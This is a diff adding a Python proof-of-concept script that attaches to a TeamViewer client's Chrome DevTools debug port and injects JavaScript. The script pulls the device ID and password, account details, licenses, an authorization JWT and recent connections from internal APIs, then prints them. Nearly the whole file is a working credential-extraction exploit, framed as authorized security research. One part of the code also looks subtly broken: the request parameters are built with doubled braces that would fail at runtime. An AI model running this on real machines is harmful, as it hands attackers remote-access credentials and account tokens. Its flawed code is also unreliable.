@@ -1,0 +1,58 @@
+"""
+teamviewer_full_extract.py -- PoC consolidado
+Extrae todas las credenciales y datos accesibles via CDP.
+Solo para investigacion de seguridad autorizada.
+"""
+import requests
+import websocket
+import json
+
+CDP_PORT = 9229
+INTERNAL_DOMAIN = "https://teamviewer-internal-<HASH>"
+
+ENDPOINTS = {
+    "credentials":    "/api/mydevice/v1/credentials/idpassword",
+    "account":        "/api/account/v1/account",
+    "licenses":       "/api/account/v1/licenses",
+    "jwt":            "/api/p2auth/v2/authorize",
+    "recent_conns":   "/api/recentconnections/v1/recentconnections",
+}
+
+def fetch_internal(ws, endpoint_path):
+    """Ejecutar fetch() a un endpoint interno via CDP."""
+    url = f"{INTERNAL_DOMAIN}{endpoint_path}"
+    js = f"""
+    (async () => {{
+        const r = await fetch('{url}');
+        return JSON.stringify(await r.json());
+    }})()
+    """
+    ws.send(json.dumps({
+        "id": 1, "method": "Runtime.evaluate",
+        "params": {{"expression": js, "awaitPromise": True}}
+    }))
+    result = json.loads(ws.recv())
+    return json.loads(result["result"]["result"]["value"])
+
+def main():
+    # Conectar al target principal
+    targets = requests.get(
+        f"http://127.0.0.1:{CDP_PORT}/json"
+    ).json()
+    page = next(t for t in targets if t["type"] == "page")
+    ws = websocket.create_connection(
+        page["webSocketDebuggerUrl"]
+    )
+
+    # Extraer todos los endpoints
+    for name, path in ENDPOINTS.items():
+        print(f"\n[+] {name}:")
+        data = fetch_internal(ws, path)
+        for k, v in (data if isinstance(data, dict)
+                     else {"data": data}).items():
+            print(f"    {k}: {str(v)[:60]}")
+
+    ws.close()
+
+if __name__ == "__main__":
+    main()
